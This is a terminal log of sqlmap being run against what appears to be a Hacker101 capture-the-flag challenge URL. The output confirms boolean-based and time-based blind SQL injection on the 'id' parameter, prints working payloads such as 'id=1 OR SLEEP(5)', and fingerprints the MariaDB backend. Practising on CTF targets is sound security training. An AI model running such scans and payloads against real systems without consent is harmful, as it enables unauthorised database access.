[cptawe@AweTux ~]$ sqlmap -u "https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=1" --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:09:53 /2022-03-26/

[17:09:53] [INFO] testing connection to the target URL
[17:09:55] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:09:56] [INFO] testing if the target URL content is stable
[17:10:01] [INFO] target URL content is stable
[17:10:01] [INFO] testing if GET parameter 'id' is dynamic
[17:10:01] [WARNING] GET parameter 'id' does not appear to be dynamic
[17:10:07] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[17:10:07] [INFO] testing for SQL injection on GET parameter 'id'
[17:10:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:10:11] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[17:10:30] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:10:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:10:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:10:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:10:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:10:33] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[17:10:34] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[17:10:34] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:10:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:10:36] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:10:36] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:10:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:10:38] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:10:38] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:10:39] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:10:40] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:10:40] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:10:41] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[17:10:44] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:10:45] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[17:10:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[17:10:46] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[17:10:47] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[17:10:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:10:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[17:10:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[17:10:50] [INFO] testing 'Generic inline queries'
[17:10:51] [INFO] testing 'MySQL inline queries'
[17:10:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[17:10:51] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[17:10:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[17:10:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[17:10:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[17:10:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[17:10:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[17:10:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:11:05] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[17:11:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[17:11:17] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[17:11:44] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable 
[17:11:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:11:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:11:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:11:49] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[17:11:53] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[17:12:14] [INFO] target URL appears to be UNION injectable with 1 columns
[17:12:18] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:12:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:12:58] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[17:13:15] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[17:13:31] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[17:13:44] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[17:14:04] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[17:14:17] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[17:14:38] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[17:14:52] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[17:15:14] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2374=2374

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: id=1 OR SLEEP(5)
---
[17:15:21] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.19.9.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:15:23] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 10 times, 500 (Internal Server Error) - 278 times
[17:15:23] [INFO] fetched data logged to text files under '/home/cptawe/.local/share/sqlmap/output/38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com'

[*] ending @ 17:15:23 /2022-03-26/